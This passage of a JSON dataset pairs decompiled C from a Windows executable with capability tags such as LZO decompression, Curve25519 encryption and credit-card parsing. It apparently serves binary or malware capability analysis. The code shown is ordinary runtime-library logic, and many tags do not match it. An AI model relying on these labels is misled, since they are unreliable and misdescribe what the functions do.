piStack32;\n            iVar9 = param_2 + param_3 + piVar4;\n            if (param_2 < 0x10) {\n                fcn.00408060(piVar4, param_1, param_2);\n                fcn.004085e0(param_2 + piVar4, cVar8, param_3);\n                fcn.00408060(iVar9, param_2 + param_1, iVar7);\n                *param_1 = piVar4;\n                return param_1;\n            }\n            piVar1 = *param_1;\n            fcn.00408060(piVar4, piVar1, uVar6);\n            fcn.004085e0(param_2 + piVar4, cVar8, param_3);\n            fcn.00408060(iVar9, piVar1 + uVar6, iVar7);\n            arg_8h = piVar1;\n            if ((param_2 + 1U < 0x1000) || (arg_8h = piVar1[-1],  piVar1 + (-4 - arg_8h) < 0x20)) {\n                fcn.00406db9(arg_8h);\n                *param_1 = piVar4;\n                return param_1;\n            }\n            goto code_r0x004047f4;\n        }\n    }\n    fcn.00403320();\ncode_r0x004047f4:\n    fcn.0040b82f();\n    pcVar2 = swi(3);\n    ppiVar5 = (*pcVar2)();\n    return ppiVar5;\n}\n",
        "token_count": 927
    },
    "0040d09a": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d09a(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[4] = param_1[4] + 4;\n    puVar2 = *(param_1[4] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xc] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.0040bc7d(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n        param_1[0xc] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xe) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x0040d0eb;\n        }\n    }\n    *(param_1 + 0xe) = 0;\ncode_r0x0040d0eb:\n    param_1[0xd] = uVar5;\n    return 1;\n}\n",
        "token_count": 315
    },
    "00407c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c30(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_10h;\n    uint lpArguments;\n    int32_t *var_8h;\n    uint8_t *var_4h;\n    \n    lpArguments = 0x19930520;\n    if (arg_ch != NULL) {\n        if ((*arg_ch & 0x10) != 0) {\n            iVar1 = *(*arg_8h + -4);\n            pcVar2 = *(iVar1 + 0x20);\n            arg_ch = *(iVar1 + 0x18);\n            (**0x424130)(*arg_8h + -4);\n            (*pcVar2)();\n            if (arg_ch == NULL) goto code_r0x00407c77;\n        }\n        if ((*arg_ch & 8) != 0) {\n            lpArguments = 0x1994000;\n        }\n    }\ncode_r0x00407c77:\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0xe06d7363, 1, 3, &lpArguments);\n    return;\n}\n",
        "token_count": 284
    },
    "0040d313": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040d313(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    *(param_1 + 0x10) = *(param_1 + 0x10) + 4;\n    puVar1 = *(*(param_1 + 0x10) + -4);\n    iVar2 = fcn.0041546e();\n    if (iVar2 == 0) {\ncode_r0x0040d32c:\n        iVar2 = *(param_1 + 8);\n        *(iVar2 + 0x1c) = 1;\n        *(iVar2 + 0x18) = 0x16;\n        uVar3 = fcn.0040b7a2(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar3 = uVar3 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.0040d046(*(param_1 + 0x28));\n        if (iVar2 == 1) {\n            uVar3 = 0;\n            *puVar1 = *(param_1 + 0x14);\n        }\n        else if (iVar2 == 2) {\n            uVar3 = *(param_1 + 0x14);\n            *puVar1 = *(param_1 + 0x14);\n        }\n        else if (iVar2 == 4) {\n            uVar3 = *(param_1 + 0x14);\n            *puVar1 = uVar3;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x0040d32c;\n            uVar3 = *(param_1 + 0x14);\n            *puVar1 = uVar3;\n            puVar1[1] = uVar3 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar3 = CONCAT31(uVar3 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 472
    },
    "0040739c": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040740b)\n// WARNING: Removing unreachable block (ram,0x004073cf)\n// WARNING: Removing unreachable block (ram,0x00407483)\n\nuint fcn.0040739c(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x48f424 = 0;\n    *0x48e240 = *0x48e240 | 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(10);\n    uVar4 = *0x48e240;\n    if (iVar3 != 0) {\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar5 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar4 = *puVar2 & 0xfff3ff0,  uVar4 == 0x106c0 || (uVar4 == 0x20660)) || (uVar4 == 0x20670)) ||\n             ((uVar4 == 0x30650 || (uVar4 == 0x30660)))) || (uVar4 == 0x30670)))) {\n            *0x48f428 = *0x48f428 | 1;\n        }\n        if (*piVar1 < 7) {\n            uVar6 = 0;\n        }\n        else {\n            iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar3 + 4);\n            if ((uVar6 & 0x200) != 0) {\n                *0x48f428 = *0x48f428 | 2;\n            }\n        }\n        *0x48f424 = 1;\n        uVar4 = *0x48e240 | 2;\n        if ((uVar5 & 0x100000) != 0) {\n            uVar4 = *0x48e240 | 6;\n            *0x48f424 = 2;\n            if ((((uVar5 & 0x8000000) != 0) && ((uVar5 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x48f424 = 3;\n                uVar4 = *0x48e240 | 0xe;\n                if ((uVar6 & 0x20) != 0) {\n                    *0x48f424 = 5;\n                    uVar4 = *0x48e240 | 0x2e;\n                    if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                        *0x48e240 = *0x48e240 | 0x6e;\n                        *0x48f424 = 6;\n                        uVar4 = *0x48e240;\n                    }\n                }\n            }\n        }\n    }\n    *0x48e240 = uVar4;\n    return 0;\n}\n",
        "token_count": 848
    },
    "00420a39": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420a39(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    uVar1 = arg_8h & 0x8040;\n    if (uVar1 == 0x8000) {\n        uVar3 = 0xc00;\n    }\n    else if (uVar1 == 0x40) {\n        uVar3 = 0x800;\n    }\n    else {\n        uVar3 = 0x400;\n        if (uVar1 != 0x8040) {\n            uVar3 = 0;\n        }\n    }\n    uVar2 = arg_8h & 0x6000;\n    if (uVar2 != 0) {\n        if (uVar2 == 0x2000) {\n            uVar4 = 0x100;\n        }\n        else if (uVar2 == 0x4000) {\n            uVar4 = 0x200;\n        }\n        else if (uVar2 == 0x6000) {\n            uVar4 = 0x300;\n        }\n    }\n    return (((arg_8h & 0x400 | (arg_8h >> 2 & 0x400 | arg_8h & 0x800) >> 2) >> 2 | arg_8h & 0x200) >> 3 | arg_8h & 0x180\n           ) >> 3 | uVar3 | uVar4;\n}\n",
        "token_count": 363
    },
    "0040b7a2": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b7a2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    \n    iVar1 = *arg_1ch;\n    if (((iVar1 == 0) && (iVar1 = fcn.0040b5c0(),  iVar1 == 0)) || (pcVar4 = *(iVar1 + 0x35c),  pcVar4 == NULL)) {\n        iVar1 = fcn.0040b597();\n        uVar2 = *0x48e22c & 0x1f;\n        uVar3 = *(iVar1 * 4 + 0x48f80c) ^ *0x48e22c;\n        pcVar4 = uVar3 >> uVar2 | uVar3 << 0x20 - uVar2;\n        if (pcVar4 == NULL) {\n            fcn.0040b84c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n    }\n    (**0x424130)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 338
    },
    "004128e6": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004128e6(int32_t **param_1)\n\n{\n    uint32_t arg_8h;\n    uint32_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t *arg_8h_00;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = **param_1;\n    if (puVar1 == NULL) {\ncode_r0x004129e0:\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar3 = *0x48e22c & 0x1f;\n        puVar6 = (puVar1[1] ^ *0x48e22c) >> uVar3 | (puVar1[1] ^ *0x48e22c) << 0x20 - uVar3;\n        arg_8h_00 = (puVar1[2] ^ *0x48e22c) >> uVar3 | (puVar1[2] ^ *0x48e22c) << 0x20 - uVar3;\n        uVar4 = (*puVar1 ^ *0x48e22c) >> uVar3 | (*puVar1 ^ *0x48e22c) << 0x20 - uVar3;\n        arg_8h = uVar4;\n        if (puVar6 == arg_8h_00) {\n            uVar5 = arg_8h_00 - uVar4 >> 2;\n            uVar7 = 0x200;\n            if (uVar5 < 0x201) {\n                uVar7 = uVar5;\n            }\n            uVar7 = uVar7 + uVar5;\n            if (uVar7 == 0) {\n                uVar7 = 0x20;\n            }\n            if (uVar7 < uVar5) {\ncode_r0x0041295e:\n                uVar7 = uVar5 + 4;\n                arg_8h = fcn.0041e78e(uVar4, uVar7, 4);\n                fcn.0041451c(0);\n                if (arg_8h == 0) goto code_r0x004129e0;\n            }\n            else {\n                arg_8h = fcn.0041e78e(uVar4, uVar7, 4);\n                fcn.0041451c(0);\n                if (arg_8h == 0) goto code_r0x0041295e;\n            }\n            uVar4 = *0x48e22c;\n            arg_8h_00 = arg_8h + uVar7 * 4;\n            puVar6 = arg_8h + uVar5 * 4;\n            for (puVar1 = puVar6; puVar1 != arg_8h_00; puVar1 = puVar1 + 1) {\n                *puVar1 = uVar4;\n            }\n        }\n        uVar4 = fcn.00410656(*param_1[1]);\n        *puVar6 = uVar4;\n        uVar2 = fcn.00410656(arg_8h);\n        ***param_1 = uVar2;\n        uVar2 = fcn.00410656(puVar6 + 1);\n        *(**param_1 + 4) = uVar2;\n        uVar2 = fcn.00410656(arg_8h_00);\n        *(**param_1 + 8) = uVar2;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 831
    },
    "0041c9ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c9ee(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint arg_10h;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint *arg_18h;\n    uint *puVar11;\n    uint8_t *puVar12;\n    uint *puVar13;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = 0;\n    if ((*(arg_8h + 0xb0) == 0) && (*(arg_8h + 0xac) == 0)) {\n        var_4h = NULL;\n        arg_18h = 0x48e280;\n        puVar11 = NULL;\n    }\n    else {\n        var_ch = 1;\n        arg_18h = fcn.004144bf(1, 0x50);\n        if (arg_18h == NULL) {\n            return 1;\n        }\n        puVar11 = *(arg_8h + 0x88);\n        puVar13 = arg_18h;\n        for (iVar9 = 0x14; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar13 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar13 = puVar13 + 1;\n        }\n        var_4h = fcn.00414556(4);\n        puVar11 = NULL;\n        fcn.0041451c(0);\n        if (var_4h == NULL) {\n            fcn.0041451c(arg_18h);\n            return 1;\n        }\n        *var_4h = 0;\n        if (*(arg_8h + 0xb0) != 0) {\n            var_8h = fcn.00414556(4);\n            fcn.0041451c(0);\n            if (var_8h == NULL) {\n                fcn.0041451c(arg_18h);\n            }\n            else {\n                *var_8h = 0;\n                arg_10h = *(arg_8h + 0xb0);\n                uVar4 = fcn.00416781(&var_14h, 1, arg_10h, 0xe, arg_18h);\n                uVar5 = fcn.00416781(&var_14h, 1, arg_10h, 0xf, arg_18h + 1);\n                uVar6 = fcn.00416781(&var_14h, 1, arg_10h, 0x10, arg_18h + 2);\n                uVar7 = fcn.00416781(&var_14h, 2, arg_10h, 0xe, arg_18h + 0xc);\n                uVar8 = fcn.00416781(&var_14h, 2, arg_10h, 0xf, arg_18h + 0xd);\n                if ((uVar8 | uVar4 | uVar5 | uVar6 | uVar7) == 0) {\n                    puVar10 = arg_18h[2];\n                    while (uVar2 = *puVar10,  uVar2 != 0) {\n                        if (uVar2 - 0x30 < 10) {\n                            *puVar10 = uVar2 - 0x30;\ncode_r0x0041cb58:\n                            puVar10 = puVar10 + 1;\n                        }\n                        else {\n                            puVar12 = puVar10;\n                            if (uVar2 != 0x3b) goto code_r0x0041cb58;\n                            do {\n                                puVar1 = puVar12 + 1;\n                                *puVar12 = *puVar1;\n                                puVar12 = puVar12 + 1;\n                            } while (*puVar1 != 0);\n                        }\n                    }\n                    *var_4h = 1;\n                    *var_8h = 1;\n                    puVar11 = var_8h;\n                    goto code_r0x0041cbb4;\n                }\n                fcn.0041c985(arg_18h);\n                fcn.0041451c(arg_18h);\n                fcn.0041451c(var_8h);\n                var_ch = 0xffffffff;\n            }\n            fcn.0041451c(var_4h);\n            return var_ch;\n        }\n        *arg_18h = *0x48e280;\n        arg_18h[1] = *0x48e284;\n        arg_18h[2] = *0x48e288;\n        arg_18h[0xc] = *0x48e2b0;\n        arg_18h[0xd] = *0x48e2b4;\n        *var_4h = 1;\n    }\ncode_r0x0041cbb4:\n    piVar3 = *(arg_8h + 0x80);\n    if (piVar3 != NULL) {\n        LOCK();\n        *piVar3 = *piVar3 + -1;\n    }\n    piVar3 = *(arg_8h + 0x7c);\n    if (piVar3 != NULL) {\n        LOCK();\n        iVar9 = *piVar3;\n        *piVar3 = iVar9 + -1;\n        if (iVar9 + -1 == 0) {\n            fcn.0041451c(*(arg_8h + 0x7c));\n            fcn.0041451c(*(arg_8h + 0x88));\n        }\n    }\n    *(arg_8h + 0x7c) = var_4h;\n    *(arg_8h + 0x80) = puVar11;\n    *(arg_8h + 0x88) = arg_18h;\n    return 0;\n}\n",
        "token_count": 1394
    },
    "0040c352": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c352(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar2 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0040bbb3();\n    iVar2 = iVar1 + -1 + iVar2;\n    *(in_ECX + 0x30) = iVar2;\n    iVar1 = iVar2;\n    for (; (0 < *(in_ECX + 0x24) || (arg_8h != 0)); arg_8h = arg_8h >> 3) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        **(in_ECX + 0x30) = (arg_8h & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar1 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = iVar2 - iVar1;\n    *(in_ECX + 0x30) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 313
    },
    "0040c3bc": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c3bc(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0040bbb3();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x30) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        uVar2 = arg_8h % 10 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = uVar2 + (arg_ch ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x30) = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar1 = *(in_ECX + 0x30);\n        arg_8h = arg_8h / 10;\n    }\n    *(in_ECX + 0x34) = iVar3 - iVar1;\n    *(in_ECX + 0x30) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 370
    },
    "0040c436": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c436(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar3 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0040bbb3();\n    iVar3 = iVar1 + -1 + iVar3;\n    *(in_ECX + 0x30) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x24) || (arg_8h != 0))) {\n        uVar2 = arg_8h;\n        arg_8h = arg_8h >> 4;\n        uVar2 = (uVar2 & 0xf) + 0x30;\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + -1;\n        if (0x39 < uVar2) {\n            uVar2 = (arg_ch ^ 1) * ' ' + '\\a' + uVar2;\n        }\n        **(in_ECX + 0x30) = uVar2;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar1 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = iVar3 - iVar1;\n    *(in_ECX + 0x30) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 389
    },
    "0040c4be": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c4be(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0040bbb3();\n    iVar4 = iVar2 + -1 + iVar4;\n    *(in_ECX + 0x30) = iVar4;\n    iVar2 = iVar4;\n    do {\n        iVar3 = *(in_ECX + 0x24);\n        if (iVar3 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = iVar4 - iVar2;\n                *(in_ECX + 0x30) = iVar2 + 1;\n                return;\n            }\n            iVar3 = *(in_ECX + 0x24);\n        }\n        uVar1 = arg_8h;\n        *(in_ECX + 0x24) = iVar3 + -1;\n        arg_8h = arg_8h >> 3 | arg_ch << 0x1d;\n        arg_ch = arg_ch >> 3;\n        **(in_ECX + 0x30) = (uVar1 & 7) + 0x30;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar2 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 401
    },
    "0040c536": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c536(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char extraout_CL;\n    char cVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar2 = fcn.0040bbb3();\n    iVar4 = iVar4 + iVar2 + -1;\n    *(in_ECX + 0x30) = iVar4;\n    var_4h = arg_8h;\n    iVar2 = iVar4;\n    while ((iVar1 = *(in_ECX + 0x24),  0 < iVar1 || ((var_4h | arg_ch) != 0))) {\n        *(in_ECX + 0x24) = iVar1 + -1;\n        uVar5 = fcn.00422db0(var_4h, arg_ch, 10, 0, iVar1);\n        arg_ch = uVar5 >> 0x20;\n        var_4h = uVar5;\n        cVar3 = extraout_CL + '0';\n        if ('9' < cVar3) {\n            cVar3 = cVar3 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x30) = cVar3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar2 = *(in_ECX + 0x30);\n    }\n    *(in_ECX + 0x34) = iVar4 - iVar2;\n    *(in_ECX + 0x30) = iVar2 + 1;\n    return;\n}\n",
        "token_count": 455
    },
    "0040c5d2": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c5d2(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *(in_ECX + 0x440);\n    if (*(in_ECX + 0x440) == 0) {\n        iVar4 = in_ECX + 0x3c;\n    }\n    iVar1 = fcn.0040bbb3();\n    iVar4 = iVar1 + -1 + iVar4;\n    *(in_ECX + 0x30) = iVar4;\n    iVar1 = iVar4;\n    do {\n        iVar2 = *(in_ECX + 0x24);\n        if (iVar2 < 1) {\n            if ((arg_8h | arg_ch) == 0) {\n                *(in_ECX + 0x34) = iVar4 - iVar1;\n                *(in_ECX + 0x30) = iVar1 + 1;\n                return;\n            }\n            iVar2 = *(in_ECX + 0x24);\n        }\n        uVar3 = arg_8h;\n        *(in_ECX + 0x24) = iVar2 + -1;\n        arg_8h = arg_8h >> 4 | arg_ch << 0x1c;\n        uVar3 = (uVar3 & 0xf) + 0x30;\n        arg_ch = arg_ch >> 4;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x30) = uVar3;\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        iVar1 = *(in_ECX + 0x30);\n    } while( true );\n}\n",
        "token_count": 465
    },
    "0040c769": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0040c769(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    \n    if (arg_8h - 0x20U < 0x5b) {\n        uVar1 = *((arg_8h - 0x20U & 0x7f) * 2 + 0x425e71);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return *((uVar1 * 9 + (arg_ch & 0xff) & 0x7f) * 2 + 0x425e70);\n}\n",
        "token_count": 140
    },
    "0040cb5a": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cb5a(uint32_t *param_1)\n\n{\n    uint32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    uchar uVar9;\n    uint32_t in_EAX;\n    char *pcVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint16_t *puVar14;\n    int32_t iVar15;\n    uint unaff_EBX;\n    uint arg_8h;\n    int32_t iStack28;\n    int32_t arg_ch;\n    \n    cVar8 = *(param_1 + 0x2d);\n    pcVar10 = in_EAX & 0xffffff00;\n    if (cVar8 != 'F') {\n        if (cVar8 == 'N') {\n            pcVar10 = *param_1 & 8;\n            if (pcVar10 != NULL) goto code_r0x0040ccb5;\n            *(param_1 + 6) = 8;\ncode_r0x0040cb8f:\n            uVar11 = param_1[2];\n            *(uVar11 + 0x1c) = 1;\n            *(uVar11 + 0x18) = 0x16;\n            uVar11 = fcn.0040b7a2(0, 0, 0, 0, 0, param_1[2]);\n            return uVar11 & 0xffffff00;\n        }\n        if (param_1[10] != 0) goto code_r0x0040cb8f;\n        if (cVar8 < 'k') {\n            if (cVar8 == 'j') {\n                param_1[10] = 5;\n                goto code_r0x0040ccb5;\n            }\n            if (cVar8 == 'I') {\n                pcVar3 = param_1[3];\n                cVar8 = *pcVar3;\n                if (cVar8 == '3') {\n                    if (pcVar3[1] == '2') {\n                        pcVar10 = pcVar3 + 2;\n                        param_1[10] = 10;\n                        param_1[3] = pcVar10;\n                    }\n                }\n                else if (cVar8 == '6') {\n                    if (pcVar3[1] == '4') {\n                        pcVar10 = pcVar3 + 2;\n                        param_1[10] = 0xb;\n                        param_1[3] = pcVar10;\n                    }\n                }\n                else if ((((cVar8 == 'd') || (cVar8 == 'i')) || (cVar8 == 'o')) ||\n                        (((cVar8 == 'u' || (cVar8 == 'x')) || (cVar8 == 'X')))) {\n                    param_1[10] = 9;\n                }\n                goto code_r0x0040ccb5;\n            }\n            if (cVar8 == 'L') {\n                param_1[10] = 8;\n                goto code_r0x0040ccb5;\n            }\n            if (cVar8 == 'T') {\n                param_1[10] = 0xd;\n                goto code_r0x0040ccb5;\n            }\n            if (cVar8 != 'h') goto code_r0x0040ccb5;\n            if (*param_1[3] == 'h') {\n                param_1[3] = param_1[3] + 1;\n                pcVar10 = 0x1;\n            }\n            else {\n                pcVar10 = 0x2;\n            }\n        }\n        else {\n            if (cVar8 != 'l') {\n                if (cVar8 == 't') {\n                    param_1[10] = 7;\n                }\n                else if (cVar8 == 'w') {\n                    param_1[10] = 0xc;\n                }\n                else if (cVar8 == 'z') {\n                    param_1[10] = 6;\n                }\n                goto code_r0x0040ccb5;\n            }\n            if (*param_1[3] == 'l') {\n                param_1[3] = param_1[3] + 1;\n                pcVar10 = 0x4;\n            }\n            else {\n                pcVar10 = 0x3;\n            }\n        }\n        param_1[10] = pcVar10;\ncode_r0x0040ccb5:\n        return CONCAT31(pcVar10 >> 8, 1);\n    }\n    pcVar10 = *param_1 & 8;\n    if (pcVar10 != NULL) goto code_r0x0040ccb5;\n    *(param_1 + 6) = 7;\n    cVar8 = *(param_1 + 0x2d);\n    if (cVar8 < 'e') {\n        if (cVar8 == 'd') {\ncode_r0x0040cd7d:\n            param_1[7] = param_1[7] | 0x10;\ncode_r0x0040cd81:\n            cVar8 = fcn.0040c058(0);\n        }\n        else if (cVar8 < 'Y') {\n            if (cVar8 == 'X') {\n                arg_8h = 1;\ncode_r0x0040cd24:\n                cVar8 = fcn.0040c1d5(arg_8h);\n            }\n            else {\n                if (cVar8 != 'A') {\n                    if (cVar8 == 'C') goto code_r0x0040cd3d;\n                    if (cVar8 < 'E') goto code_r0x0040d038;\n                    if ('G' < cVar8) {\n                        if (cVar8 != 'S') goto code_r0x0040d038;\n                        goto code_r0x0040cd0c;\n                    }\n                }\ncode_r0x0040cd8b:\n                cVar8 = fcn.0040d0f4();\n            }\n        }\n        else if (cVar8 == 'Z') {\n            cVar8 = fcn.0040d09a();\n        }\n        else {\n            if (cVar8 == 'a') goto code_r0x0040cd8b;\n            if (cVar8 != 'c') goto code_r0x0040d038;\ncode_r0x0040cd3d:\n            cVar8 = fcn.0040d27e(0);\n        }\n    }\n    else if (cVar8 < 'q') {\n        if (cVar8 == 'p') {\n            cVar8 = fcn.0040d3b4();\n        }\n        else {\n            if (cVar8 < 'h') goto 